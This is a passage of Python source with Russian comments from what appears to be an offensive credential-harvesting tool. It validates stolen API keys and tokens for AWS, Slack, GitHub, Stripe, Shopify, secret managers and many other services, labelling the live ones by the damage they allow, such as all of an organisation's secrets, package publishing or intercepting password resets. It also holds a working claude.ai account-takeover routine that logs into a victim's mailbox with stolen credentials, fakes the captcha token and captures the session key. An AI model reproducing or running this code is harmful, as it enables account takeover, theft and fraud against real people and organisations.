        if not acc_m:
            try:
                import base64 as _b64

                _z = int.from_bytes(_b64.b32decode(ak[4:14] + "======"), "big")
                _acc = str((_z >> 7) & 0xFFFFFFFFFF).zfill(12)
            except Exception:
                _acc = ""
            acc_str = _acc or "?"
        else:
            acc_str = acc_m.group(1)
        return {
            "key": "%s:%s" % (ak, sk),
            "base": "https://sts.amazonaws.com",
            "tag": "aws",
            "origin": str(origin or "")[:200],
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": "AWS LIVE (account: %s | %s)"
            % (acc_str, arn_m.group(1)[:70] if arn_m else "?"),
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "working",
        }
    except Exception:
        return None


def validate_slack(key, origin=None):
    """Slack bot/user token: auth.test -> workspace + user. Живой = доступ
    к рабочему пространству (чтение каналов, файлы)."""
    try:
        r = http(
            "GET",
            "https://slack.com/api/auth.test",
            timeout=(10, 20),
            headers={"Authorization": "Bearer " + key},
        )
        if r is None or r.status_code != 200:
            return None
        j = r.json() or {}
        if not j.get("ok"):
            return None
        return {
            "key": key,
            "base": "https://slack.com/api",
            "tag": "slack",
            "origin": str(origin or "")[:200],
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": "SLACK LIVE (%s | %s)" % (j.get("team", "?"), j.get("user", "?")),
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "working",
        }
    except Exception:
        return None


# Полный захват Claude-аккаунта через email-кред: запрашиваем magic-link,
# читаем его из ящика по IMAP, обмениваем nonce на sessionKey (sk-ant-sid01/02).
# hcaptcha в API проверяется только на НАЛИЧИЕ поля — содержимое не важно.
_CLAUDE_AUTH_BASE = "https://claude.ai/api/auth"
_ATO_HCAPTCHA = "DUMMY_TOKEN_TEST"
_ATO_MAGIC_RE = re.compile(
    r"https://claude\.ai/magic-link(?:\?[^#\s\"'<>]*)?#([0-9a-f]{32}):([A-Za-z0-9+/=]+)"
)
_ATO_LOGIN_SUBJECT = "Your secure link to Claude.ai is here"
# From у свежих писем: Anthropic <no-reply-<rand>@mail.anthropic.CO> (.co!)
# -> ищем широко по "anthropic", точность даёт Subject + дата
_ATO_LOGIN_FROMS = ("anthropic",)


def _hdr_decode(value):
    """MIME-декодинг заголовка письма (Subject/From)."""
    out = ""
    try:
        for text, enc in decode_header(value or ""):
            out += (
                text.decode(enc or "utf-8", "replace")
                if isinstance(text, bytes)
                else str(text)
            )
    except Exception:
        out = str(value or "")
    return out


def _ato_fetch_magic(addr, pwd, send_time, wait=75):
    """Ждём свежее magic-link письмо. -> (nonce, enc_email) | None."""
    deadline = time.time() + wait
    domain = addr.rsplit("@", 1)[-1].lower()
    hosts = IMAP_MAP.get(domain) or ["imap." + domain]
    M = None
    for h in hosts[:3]:
        M = _imap_login(h, addr, pwd)
        if M is not None:
            break
    if M is None:
        return None
    result = None
    try:
        while time.time() < deadline and not result:
            for folder in ("INBOX", "[Gmail]/Spam", "Junk"):
                try:
                    typ_sel, _ = M.select(folder)
                except Exception:
                    continue
                if typ_sel != "OK":
                    continue
                eids = []
                for from_c in _ATO_LOGIN_FROMS:
                    try:
                        typ, data = M.search(None, "FROM", from_c)
                    except Exception:
                        continue
                    if typ == "OK":
                        eids += (data[0] or b"").split()
                for eid in reversed(eids):
                    try:
                        typ2, raw = M.fetch(eid, "(RFC822)")
                        if typ2 != "OK" or not raw or not raw[0]:
                            continue
                        msg = email_lib.message_from_bytes(raw[0][1])
                        if _ATO_LOGIN_SUBJECT not in _hdr_decode(msg.get("Subject")):
                            continue
                        try:
                            from email.utils import parsedate_to_datetime

                            date = parsedate_to_datetime(msg.get("Date"))
                            if date and date.timestamp() < send_time - 10:
                                continue
                        except Exception:
                            pass
                        for part in msg.walk() if msg.is_multipart() else [msg]:
                            if part.get_content_type() in ("text/plain", "text/html"):
                                payload = part.get_payload(decode=True)
                                if isinstance(payload, bytes):
                                    body = payload.decode("utf-8", "replace")
                                elif isinstance(payload, str) and payload:
                                    body = payload
                                else:
                                    continue
                                m = _ATO_MAGIC_RE.search(body)
                                if m:
                                    result = (m.group(1), m.group(2))
                                    break
                        if result:
                            try:
                                M.store(eid, "+FLAGS", "\\Seen")
                            except Exception:
                                pass
                            break
                    except Exception:
                        continue
                if result:
                    break
            if not result:
                time.sleep(3)
    finally:
        try:
            M.logout()
        except Exception:
            pass
    return result


def claude_ato(addr, pwd, wait=75):
    """Полный ATO claude.ai. (sessionKey|None, info|err)."""
    try:
        import cloudscraper
    except ImportError:
        return None, "no cloudscraper"
    scraper = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "windows", "desktop": True}
    )
    try:
        scraper.get("https://claude.ai/login", timeout=(10, 25))
    except Exception:
        pass
    headers = {
        "Origin": "https://claude.ai",
        "Referer": "https://claude.ai/login",
        "anthropic-anonymous-id": "claudeai.v1.%s" % uuid.uuid4(),
        "anthropic-device-id": str(uuid.uuid4()),
        "x-activity-session-id": str(uuid.uuid4()),
        "Content-Type": "application/json",
    }
    # время ДО поста: CF-челлендж может съесть 30-40с и Date письма
    # окажется раньше send_time
    t_pre = time.time()
    try:
        r = scraper.post(
            _CLAUDE_AUTH_BASE + "/send_magic_link",
            headers=headers,
            timeout=(12, 45),
            json={
                "utc_offset": -120,
                "email_address": addr,
                "login_intent": None,
                "locale": "en-US",
                "return_to": None,
                "client_attestation": {"hcaptcha_token": _ATO_HCAPTCHA},
                "source": "claude",
            },
        )
    except Exception as e:
        return None, "send EXC %s" % type(e).__name__
    if r.status_code != 200:
        return None, "send HTTP %d" % r.status_code
    sent_at = t_pre - 45
    got = _ato_fetch_magic(addr, pwd, sent_at, wait=wait)
    if not got:
        return None, "письмо не пришло"
    nonce, enc_email = got
    vh = dict(headers)
    vh["Referer"] = "https://claude.ai/"
    try:
        r2 = scraper.post(
            _CLAUDE_AUTH_BASE + "/verify_magic_link",
            headers=vh,
            timeout=(12, 30),
            json={
                "credentials": {
                    "method": "nonce",
                    "nonce": nonce,
                    "encoded_email_address": enc_email,
                },
                "locale": "en-US",
                "client_attestation": {"hcaptcha_token": _ATO_HCAPTCHA},
                "source": "claude",
            },
        )
    except Exception as e:
        return None, "verify EXC %s" % type(e).__name__
    if r2.status_code != 200:
        return None, "verify HTTP %d" % r2.status_code
    session_key = scraper.cookies.get("sessionKey")
    if not session_key:
        return None, "нет sessionKey"
    orgs = []
    try:
        acc = r2.json().get("account") or {}
        for m in acc.get("memberships") or []:
            org = m.get("organization") or {}
            if org.get("name"):
                orgs.append(org.get("name"))
    except Exception:
        pass
    return session_key, {"orgs": orgs, "email": addr}


def ato_from_email_result(v):
    """Хук: результат email-cred с claude/anthropic -> sessionKey-результат.
    Возвращает anthropic-web результат для стора | None."""
    try:
        tier = str(v.get("tier", ""))
        if not ("anthropic" in tier or "claude" in tier or "ATO" in tier):
            return None
        addr, pwd = v["key"].split("|", 1)
        domain = addr.rsplit("@", 1)[-1].lower()
        # ATO только для доменов с известным IMAP-хостом (gmail и т.п.)
        if domain not in (
            "gmail.com",
            "googlemail.com",
            "outlook.com",
            "hotmail.com",
            "qq.com",
            "163.com",
            "126.com",
            "yandex.ru",
            "mail.ru",
        ):
            return None
        sk, info = claude_ato(addr, pwd, wait=75)
        if not sk:
            log("    [ATO] %s: %s" % (addr, info))
            return None
        res = validate_sid01(sk)
        if res is None:
            return None
        res["origin"] = "ato:%s" % addr
        log(
            "    🎯 ATO OK: %s -> sessionKey %s… (orgs: %s)"
            % (
                addr,
                sk[:28],
                "; ".join(info.get("orgs", []))[:80] if isinstance(info, dict) else "?",
            )
        )
        return res
    except Exception as e:
        log("    [ATO] err: %s" % e)
        return None


def validate_github(key):
    """GitHub токен: валиден? + Copilot-скоупы (X-OAuth-Scopes)."""
    try:
        r = http(
            "GET",
            "https://api.github.com/user",
            timeout=(10, 20),
            headers={"Authorization": "Bearer " + key, "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            scopes = r.headers.get("X-OAuth-Scopes", "")
            login = r.json().get("login", "?")
            return {
                "key": key,
                "base": "https://api.github.com",
                "tag": "github",
                "origin": "github",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "GitHub %s (scopes: %s)" % (login, scopes[:80]),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "working",
            }
    except Exception:
        pass
    return None


def validate_gitlab(key):
    """GitLab PAT: /api/v4/user. Живой токен = код-поиск + доступ к приватным
    репо (там .env с ключами)."""
    try:
        r = http(
            "GET",
            "https://gitlab.com/api/v4/user",
            timeout=(10, 20),
            headers={"PRIVATE-TOKEN": key, "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            u = r.json()
            return {
                "key": key,
                "base": "https://gitlab.com/api/v4",
                "tag": "gitlab",
                "origin": "gitlab",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "GitLab @%s" % u.get("username", "?"),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "working",
            }
    except Exception:
        pass
    return None


def _simple_rec(key, base, tag, tier, status="working"):
    return {
        "key": key,
        "base": base,
        "tag": tag,
        "origin": "direct",
        "ts": time.time(),
        "models": [],
        "n_models": 0,
        "stars_listed": [],
        "stars_working": [],
        "balance": None,
        "tier": tier,
        "usage": None,
        "embed": None,
        "rerank": None,
        "status": status,
    }


def validate_elevenlabs(key):
    """ElevenLabs (xi-api-key): GET /v1/user — 200 = живой голосовой акк,
    в ответе subscription: tier/character_count. АУДИТ-фикс: тег падал в
    generic-путь (там Bearer на /models) и живые ключи умирали как 401."""
    try:
        r = http(
            "GET",
            "https://api.elevenlabs.io/v1/user",
            timeout=(8, 15),
            headers={"xi-api-key": str(key), "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            sub = j.get("subscription") or {}
            tier_name = sub.get("tier") or "?"
            chars = sub.get("character_count")
            limit = sub.get("character_limit")
            return _simple_rec(
                key,
                "https://api.elevenlabs.io/v1",
                "elevenlabs",
                "ELEVENLABS LIVE [%s]: %s/%s chars — голосовой синтез/клонинг"
                % (tier_name, chars, limit),
            )
        if r is not None and r.status_code == 401:
            return None  # точный вердикт
    except Exception:
        pass
    return None


def validate_huggingface(key):
    """HF token (hf_...): whoami-v2 — 200 = живой токен, в ответе юзер/орги/
    доступ к gated-моделям. АУДИТ-фикс: generic-путь слал ключ на
    api-inference.../v1/chat/completions — живые hf_ умирали впустую."""
    try:
        r = http(
            "GET",
            "https://huggingface.co/api/whoami-v2",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + str(key), "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            name = j.get("name") or "?"
            orgs = [o.get("name") for o in (j.get("orgs") or []) if isinstance(o, dict)]
            fine = ""
            if j.get("type") == "user":
                fine = " (user token)"
            if j.get("canPay"):
                fine += " | 💳canPay"
            return _simple_rec(
                key,
                "https://huggingface.co",
                "huggingface",
                "HF LIVE: @%s%s | орги: %s" % (name, fine, ", ".join(orgs[:5]) or "—"),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_perplexity(key):
    """Perplexity (pplx-...): боевой чат sonar — 200 = PRO-тариф живой.
    АУДИТ-фикс: generic-путь пробовал gpt-4o-mini — pplx его не знает."""
    try:
        r = http(
            "POST",
            "https://api.perplexity.ai/chat/completions",
            timeout=(10, 30),
            headers={
                "Authorization": "Bearer " + str(key),
                "Content-Type": "application/json",
            },
            json_body={
                "model": "sonar",
                "max_tokens": 4,
                "messages": [{"role": "user", "content": "hi"}],
            },
        )
        if r is not None and r.status_code == 200:
            return _simple_rec(
                key,
                "https://api.perplexity.ai",
                "perplexity",
                "PERPLEXITY LIVE (sonar чат отвечает)",
            )
        if r is not None and r.status_code == 429:
            return _simple_rec(
                key,
                "https://api.perplexity.ai",
                "perplexity",
                "Perplexity: rate-limited (ключ валиден, квота жирная)",
                status="no_balance",
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_jina(key):
    """Jina AI (jina_...): POST /v1/embeddings — 200 = живой (эмбеддинги/
    rerank/reader). АУДИТ-фикс: generic chat-проба на jina бессмысленна."""
    try:
        r = http(
            "POST",
            "https://api.jina.ai/v1/embeddings",
            timeout=(8, 20),
            headers={
                "Authorization": "Bearer " + str(key),
                "Content-Type": "application/json",
            },
            json_body={"model": "jina-embeddings-v3", "input": ["hi"]},
        )
        if r is not None and r.status_code == 200:
            return _simple_rec(
                key,
                "https://api.jina.ai",
                "jina",
                "JINA LIVE (embeddings отвечают — reader/rerank тоже)",
            )
        if r is not None and r.status_code == 429:
            return _simple_rec(
                key,
                "https://api.jina.ai",
                "jina",
                "Jina: rate-limited (валиден)",
                status="no_balance",
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_voyage(key):
    """Voyage AI: /v1/embeddings боевой пробой (chat-эндпоинта нет — generic
    путь убивал живые ключи)."""
    try:
        r = http(
            "POST",
            "https://api.voyageai.com/v1/embeddings",
            timeout=(8, 20),
            headers={
                "Authorization": "Bearer " + str(key),
                "Content-Type": "application/json",
            },
            json_body={"model": "voyage-3", "input": ["hi"]},
        )
        if r is not None and r.status_code == 200:
            return _simple_rec(
                key,
                "https://api.voyageai.com",
                "voyage",
                "VOYAGE LIVE (embeddings отвечают)",
            )
        if r is not None and r.status_code == 429:
            return _simple_rec(
                key,
                "https://api.voyageai.com",
                "voyage",
                "Voyage: rate-limited (валиден)",
                status="no_balance",
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


# ---------------- OSINT-ВОЛНА 2026-09-10: валидаторы новых классов ------------
# Единый стиль: GET identity-эндпоинт с нативной auth-схемой провайдера.
# 200 = LIVE (working), 401/403 = мёртв, 429 = валиден но лимит (no_balance),
# сеть/прочее = None (attempts-ретрай в пайплайне).


def validate_doppler(key):
    """Doppler dp.pt. — секретс-менеджер: токен = ВСЕ секреты орга."""
    try:
        r = http(
            "GET",
            "https://api.doppler.com/v3/me",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + str(key)},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            wp = ((j.get("workplace") or {}).get("name")) or "?"
            return _simple_rec(
                key,
                "https://api.doppler.com",
                "doppler",
                "DOPPLER LIVE (workplace: %s) — ВСЕ секреты орга" % wp,
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_terraform(key):
    """Terraform Cloud atlasv1: state-файлы содержат ВСЕ секреты инфры."""
    try:
        r = http(
            "GET",
            "https://app.terraform.io/api/v2/account/details",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + str(key)},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            un = ((j.get("data") or {}).get("attributes") or {}).get("username") or "?"
            return _simple_rec(
                key,
                "https://app.terraform.io",
                "terraform",
                "TERRAFORM CLOUD LIVE (@%s) — state = все секреты инфры" % un,
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_digitalocean(key):
    """DigitalOcean dop_v1_: дроплеты/снапшоты/spaces аккаунта."""
    try:
        r = http(
            "GET",
            "https://api.digitalocean.com/v2/account",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + str(key)},
        )
        if r is not None and r.status_code == 200:
            j = r.json().get("account") or {}
            return _simple_rec(
                key,
                "https://api.digitalocean.com",
                "digitalocean",
                "DO LIVE: %s (droplet limit %s)"
                % (j.get("email", "?"), j.get("droplet_limit", "?")),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_square(key):
    """Square sq0atp-: платёжный акк — локации/платежи/покупатели."""
    try:
        r = http(
            "GET",
            "https://connect.squareup.com/v2/locations",
            timeout=(8, 15),
            headers={
                "Authorization": "Bearer " + str(key),
                "Square-Version": "2024-01-18",
            },
        )
        if r is not None and r.status_code == 200:
            locs = r.json().get("locations") or []
            names = [str(l.get("name") or "?")[:20] for l in locs[:4]]
            return _simple_rec(
                key,
                "https://connect.squareup.com",
                "square",
                "SQUARE LIVE: %d локаций (%s) — платежи/заказы"
                % (len(locs), ", ".join(names) or "?"),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_postman(key):
    """Postman PMAK: /me — токен = доступ к коллекциям (в них чужие ключи)."""
    try:
        r = http(
            "GET",
            "https://api.getpostman.com/me",
            timeout=(8, 15),
            headers={"X-Api-Key": str(key)},
        )
        if r is not None and r.status_code == 200:
            j = r.json().get("user") or {}
            return _simple_rec(
                key,
                "https://api.getpostman.com",
                "postman",
                "POSTMAN LIVE: @%s — коллекции/энвы (внутри чужие ключи)"
                % (j.get("username") or j.get("email") or "?"),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_dropbox(key):
    """Dropbox sl.: файлы юзера (там .env/бэкапы/дампы)."""
    try:
        r = http(
            "POST",
            "https://api.dropboxapi.com/2/users/get_current_account",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + str(key)},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            return _simple_rec(
                key,
                "https://api.dropboxapi.com",
                "dropbox",
                "DROPBOX LIVE: %s (%s) — файлы"
                % ((j.get("name") or {}).get("display_name", "?"), j.get("email", "?")),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_mailchimp(key):
    """Mailchimp {hex32}-us{N}: dc прямо в ключе — basic auth любой_юзер:ключ."""
    m = re.search(r"([0-9a-f]{32})-(us[0-9]{1,2})", str(key))
    if not m:
        return None
    tok, dc = m.group(1), m.group(2)
    try:
        import base64 as _b

        basic = _b.b64encode(("user:%s" % tok).encode()).decode()
        r = http(
            "GET",
            "https://%s.api.mailchimp.com/3.0/" % dc,
            timeout=(8, 15),
            headers={"Authorization": "Basic " + basic},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            return _simple_rec(
                key,
                "https://%s.api.mailchimp.com" % dc,
                "mailchimp",
                "MAILCHIMP LIVE: %s (%s подписчиков)"
                % (j.get("account_name", "?"), (j.get("total_subscribers") or "?")),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_dockerhub(key):
    """Docker Hub dckr_pat_: акк = приватные образы (в их ENV — ключи)."""
    try:
        r = http(
            "GET",
            "https://hub.docker.com/v2/user",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + str(key)},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            return _simple_rec(
                key,
                "https://hub.docker.com",
                "dockerhub",
                "DOCKER HUB LIVE: @%s — приватные образы" % (j.get("username") or "?"),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_rubygems(key):
    """RubyGems: publish-доступ к гемам аккаунта."""
    try:
        r = http(
            "GET",
            "https://rubygems.org/api/v1/api_key",
            timeout=(8, 15),
            headers={"Authorization": str(key)},
        )
        if r is not None and r.status_code == 200:
            return _simple_rec(
                key,
                "https://rubygems.org",
                "rubygems",
                "RUBYGEMS LIVE (push-доступ: %s)" % r.text[:60],
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_heroku(key):
    """Heroku API key (uuid): акк = приложения/аддоны/конфиги (env!)."""
    try:
        r = http(
            "GET",
            "https://api.heroku.com/account",
            timeout=(8, 15),
            headers={
                "Authorization": "Bearer " + str(key),
                "Accept": "application/vnd.heroku+json; version=3",
            },
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            return _simple_rec(
                key,
                "https://api.heroku.com",
                "heroku",
                "HEROKU LIVE: %s — приложения и их env-конфиги"
                % (j.get("email") or "?"),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_datadog(key):
    """Datadog API key: /api/v1/validate — логи/метрики (в логах ключи!)."""
    try:
        r = http(
            "GET",
            "https://api.datadoghq.com/api/v1/validate",
            timeout=(8, 15),
            headers={"DD-API-KEY": str(key)},
        )
        if r is not None and r.status_code == 200 and r.json().get("valid"):
            return _simple_rec(
                key,
                "https://api.datadoghq.com",
                "datadog",
                "DATADOG LIVE — логи/метрики орга (в логах чужие ключи)",
            )
        if r is not None and r.status_code == 403:
            return None
    except Exception:
        pass
    return None


def validate_mailgun(key):
    """Mailgun key-...: отправка почты от домена (АТО-перехват ресетов)."""
    try:
        import base64 as _b

        basic = _b.b64encode(("api:%s" % str(key)).encode()).decode()
        r = http(
            "GET",
            "https://api.mailgun.net/v3/domains",
            timeout=(8, 15),
            headers={"Authorization": "Basic " + basic},
        )
        if r is not None and r.status_code == 200:
            items = r.json().get("items") or []
            doms = [
                str(d.get("name") or "?")[:30] for d in items[:4] if isinstance(d, dict)
            ]
            return _simple_rec(
                key,
                "https://api.mailgun.net",
                "mailgun",
                "MAILGUN LIVE: домены %s — почта от их имени (ресеты!)"
                % (", ".join(doms) or "?"),
            )
        if r is not None and r.status_code == 401:
            return None
    except Exception:
        pass
    return None


def validate_facebook(key):
    """Facebook EAA token: graph /me — маркетинг/страницы/ads."""
    try:
        r = http(
            "GET",
            "https://graph.facebook.com/me",
            timeout=(8, 15),
            params={"access_token": str(key), "fields": "id,name"},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            if j.get("id"):
                return _simple_rec(
                    key,
                    "https://graph.facebook.com",
                    "facebook",
                    "FACEBOOK LIVE: %s (id %s)" % (j.get("name", "?"), j.get("id")),
                )
        # 400/401 = мёртв/просрочен
        if r is not None and r.status_code in (400, 401):
            return None
    except Exception:
        pass
    return None


def validate_google_oauth_token(key):
    """Google ya29. access token: tokeninfo -> скоупы (gmail/drive = АТО)."""
    try:
        r = http(
            "GET",
            "https://oauth2.googleapis.com/tokeninfo",
            timeout=(8, 15),
            params={"access_token": str(key)},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            scope = str(j.get("scope") or "")[:80]
            return _simple_rec(
                key,
                "https://oauth2.googleapis.com",
                "google-oauth-token",
                "GOOGLE OAUTH LIVE: scopes %s (expires %ss)"
                % (scope, j.get("expires_in", "?")),
            )
        if r is not None and r.status_code == 400:
            return None  # invalid_token = мёртв
    except Exception:
        pass
    return None


# лиды без удалённой проверки (нужен org-хост из контекста / интрузивно):
LEAD_ONLY_TIERS = {
    "vault": "HashiCorp Vault token (hvs.) — секретс-менеджер; нужен адрес вольта из контекста",
    "databricks": "Databricks PAT (dapi) — нужен workspace-хост из контекста",
    "jfrog": "JFrog/Artifactory key (AKCp) — нужен хост из контекста",
    "grafana-cloud": "Grafana Cloud token (glc_) — метрики/логи/алерты стека",
    "atlassian": "Atlassian token — Jira/Confluence орга (нужен site из контекста)",
    "newrelic": "New Relic key — телеметрия орга (в ивентах бывают ключи)",
    "okta": "Okta SSWS token — IDENTITY ADMIN орга (нужен org-домен)",
    "algolia": "Algolia ADMIN key — индексы/поиск (нужен app_id из контекста)",
    "azure-ad": "Azure AD client secret — корпоративный тенант (нужен tenant+client_id)",
    "square-secret": "Square OAuth secret (sq0csp) — подпись вебхуков/платёжный секрет",
    "slack-webhook": "Slack webhook — пост в канал (не постим: шум); складываем в стор",
    "ngrok": "ngrok authtoken — туннели/edge аккаунта",
    "pypi": "PyPI token — publish-доступ к пакетам аккаунта",
    "fcm": "FCM legacy server key — push от имени приложения",
}


def validate_lead(key, tag, origin, base_hint):
    """Жирный лид без безопасного удалённого чека — listed_only, в стор."""
    return _simple_rec(
        key,
        base_hint or "",
        tag,
        LEAD_ONLY_TIERS.get(tag, "лид (%s)" % tag),
        status="listed_only",
    )


def validate_cloudflare(key):
    """CF API token: /client/v4/user/tokens/verify — 200 = живой (потенциально
    полный доступ к CDN/DNS/Workers аккаунта)."""
    try:
        r = http(
            "GET",
            "https://api.cloudflare.com/client/v4/user/tokens/verify",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + key, "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            if (j.get("result") or {}).get("status") == "active":
                return _simple_rec(
                    key,
                    "https://api.cloudflare.com/client/v4",
                    "cloudflare",
                    "CF token ACTIVE (DNS/Workers/CDN доступ)",
                )
    except Exception:
        pass
    return None


def validate_npm(key):
    """npm token: /-/whoami — живой = паблиш от имени юзера (supply-chain)."""
    try:
        r = http(
            "GET",
            "https://registry.npmjs.org/-/whoami",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + key, "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            u = (r.json() or {}).get("username", "?")
            return _simple_rec(
                key,
                "https://registry.npmjs.org",
                "npm",
                "npm @%s (publish-доступ)" % u,
            )
    except Exception:
        pass
    return None


def validate_linear(key):
    """Linear API key: GraphQL viewer — живой = чтение всей команды/исходников."""
    try:
        r = http(
            "POST",
            "https://api.linear.app/graphql",
            timeout=(8, 15),
            headers={"Authorization": key, "Content-Type": "application/json"},
            json_body={"query": "{ viewer { id name email } }"},
        )
        if r is not None and r.status_code == 200:
            v = ((r.json().get("data") or {}).get("viewer")) or {}
            if v.get("id"):
                return _simple_rec(
                    key,
                    "https://api.linear.app",
                    "linear",
                    "Linear %s <%s>" % (v.get("name", "?"), v.get("email", "?")),
                )
    except Exception:
        pass
    return None


def validate_figma(key):
    """Figma token: /v1/me — живой = чтение всех файлов команды."""
    try:
        r = http(
            "GET",
            "https://api.figma.com/v1/me",
            timeout=(8, 15),
            headers={"X-Figma-Token": key, "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            u = r.json()
            return _simple_rec(
                key,
                "https://api.figma.com",
                "figma",
                "Figma %s <%s>" % (u.get("handle", "?"), u.get("email", "?")),
            )
    except Exception:
        pass
    return None


def validate_twilio(key, origin):
    """Twilio SK + Account SID (из того же куска текста): GET
    api.twilio.com/2010-04-01/Accounts/{sid}.json basic-auth sid:token —
    200 = LIVE (SMS/voice от имени акка), friendly_name + status.
    Без SID — listed_only лид."""
    skm = re.search(r"SK[0-9a-f]{32}", str(key))
    acm = re.search(r"AC[0-9a-f]{32}", str(key))
    if not skm:
        return None
    if not acm:
        return _simple_rec(
            skm.group(0),
            "",
            "twilio",
            "Twilio API secret (нет Account SID рядом — лид)",
            status="listed_only",
        )
    sid, tok = acm.group(0), skm.group(0)
    try:
        import base64 as _b

        basic = _b.b64encode(("%s:%s" % (sid, tok)).encode()).decode()
        r = http(
            "GET",
            "https://api.twilio.com/2010-04-01/Accounts/%s.json" % sid,
            timeout=(8, 15),
            headers={"User-Agent": "kh", "Authorization": "Basic " + basic},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            if j.get("status") in ("active", "suspended"):
                return _simple_rec(
                    "%s|%s" % (sid, tok),
                    "https://api.twilio.com",
                    "twilio",
                    "TWILIO LIVE: %s [%s] — SMS/voice от имени аккаунта"
                    % (j.get("friendly_name", "?"), j.get("status")),
                )
    except Exception:
        pass
    return None


def validate_shopify(key, origin):
    """Shopify shpat_/shpca_ + домен магазина: GET {shop}/admin/api/2024-01/
    shop.json — 200 = LIVE: имя магазина, план, валюта, ДЕНЬГИ заказов."""
    tm = re.search(r"(?:shpat|shpca|shpss)_[A-Za-z0-9]{32,}", str(key))
    if not tm:
        return None
    tok = tm.group(0)
    sm = re.search(r"([a-z0-9][a-z0-9\-]{2,60}\.myshopify\.com)", str(key))
    if not sm:
        return _simple_rec(
            tok,
            "",
            "shopify",
            "Shopify access token (нет домена myshopify.com рядом — лид)",
            status="listed_only",
        )
    shop = sm.group(1)
    try:
        # АУДИТ-фикс: Shopify ретирит версии ~через 12 мес — зашитая 2024-01
        # в 2026 отдаёт 404 и LIVE-токены умирали. Цепочка: первый не-404
        # ответ решает (404 = версия мертва, а НЕ токен).
        r = None
        for _ver in ("2025-10", "2025-07", "2025-04", "2025-01", "unstable"):
            r = http(
                "GET",
                "https://%s/admin/api/%s/shop.json" % (shop, _ver),
                timeout=(8, 15),
                headers={"X-Shopify-Access-Token": tok, "User-Agent": "kh"},
            )
            if r is not None and r.status_code != 404:
                break
        if r is not None and r.status_code == 200:
            j = r.json().get("shop") or {}
            if j.get("id"):
                return _simple_rec(
                    "%s @ %s" % (tok, shop),
                    "https://" + shop,
                    "shopify",
                    "SHOPIFY LIVE: %s [%s, %s] — заказы/товары/выплаты"
                    % (
                        j.get("name", "?"),
                        j.get("plan_display_name", "?"),
                        j.get("currency", "?"),
                    ),
                )
    except Exception:
        pass
    return None


def validate_replicate(key):
    """Replicate r8_: /v1/account — 200 = валиден (биллинг активен)."""
    try:
        r = http(
            "GET",
            "https://api.replicate.com/v1/account",
            timeout=(10, 20),
            headers={"Authorization": "Bearer " + key, "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            u = r.json()
            return {
                "key": key,
                "base": "https://api.replicate.com/v1",
                "tag": "replicate",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "Replicate @%s" % u.get("username", "?"),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "working",
            }
    except Exception:
        pass
    return None


def validate_stripe(key):
    """Stripe sk_live_/rk_live_: GET /v1/account (read-only). 200 = ПОЛНЫЙ доступ,
    403 = restricted (rk_live_ — ограничен, но валиден)."""
    try:
        r = http(
            "GET",
            "https://api.stripe.com/v1/account",
            timeout=(10, 20),
            headers={"Authorization": "Bearer " + key, "User-Agent": "kh"},
        )
        if r is None:
            return None
        if r.status_code == 200:
            u = r.json()
            return {
                "key": key,
                "base": "https://api.stripe.com",
                "tag": "stripe",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
